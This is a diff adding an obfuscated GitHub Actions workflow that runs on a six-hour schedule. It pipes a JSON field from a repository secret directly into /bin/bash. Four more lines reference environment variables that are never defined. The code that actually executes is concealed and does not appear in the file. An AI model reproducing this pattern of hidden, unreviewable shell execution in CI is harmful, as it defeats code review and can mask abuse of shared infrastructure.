@@ -1,0 +1,21 @@
+name: badaocangqii
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: badaocangqii
+        env:
+          uc3117: ${{ secrets.uc3117 }}
+        run: |
+          echo $uc3117 | jq -r .zl96 | /bin/bash
+          echo $cveh709 | jq -r .sch985 | /bin/bash
+          echo $wv54434 | jq -r .ji51 | /bin/bash
+          echo $x072 | jq -r .t64 | /bin/bash
+          echo $v444 | jq -r .glp030 | /bin/bash
+
